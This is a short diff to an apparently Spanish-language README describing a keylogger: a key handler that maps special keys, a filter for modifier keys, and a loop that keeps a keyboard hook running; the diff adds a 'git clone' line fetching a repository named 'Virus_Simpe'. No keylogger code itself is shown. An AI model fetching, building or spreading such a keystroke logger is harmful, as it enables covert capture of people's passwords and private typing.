@@ -48,3 +48,7 @@ Manejo de Teclas: La función en_tecla(evento) usa un diccionario (teclas_especi
 Filtro: Las teclas modificadoras (shift, ctrl, alt) son ignoradas para mantener el registro limpio y enfocado solo en el contenido escrito.
 
 Bucle de Ejecución: El bloque try/while True: time.sleep(60) mantiene el programa activo en la memoria para que el hook del teclado pueda funcionar continuamente.
+
+
+git clone https://github.com/mateovivas453-dot/Virus_Simpe.git virus_simple
+
